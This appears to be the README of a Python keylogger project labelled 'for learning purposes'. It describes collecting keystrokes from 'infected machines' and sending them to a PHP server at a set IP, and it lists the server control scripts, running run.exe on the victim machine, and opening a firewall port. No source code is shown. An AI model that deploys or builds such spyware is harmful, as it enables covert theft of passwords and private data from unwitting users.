# Keylogger

Python keylogger for learning purposes that stores collected data from infected machines in a specified IP.

## Requirements

```
PHP installed in server machine.
```

## Server usage

```
# launches the server php file that collects data
python autorun.py

# sends messages to infected machines to stop collecting data
python data_collect_stop.py

# ends server endpoint
python server_keylogger_stop.py
```

## Infected machine usage

On build folder

```
run.exe // double click on it
```

## Issues that may occur

Server machine may be blocking requests due to firewall policy, it is necessary to open the specified port in server machine for TCP connections.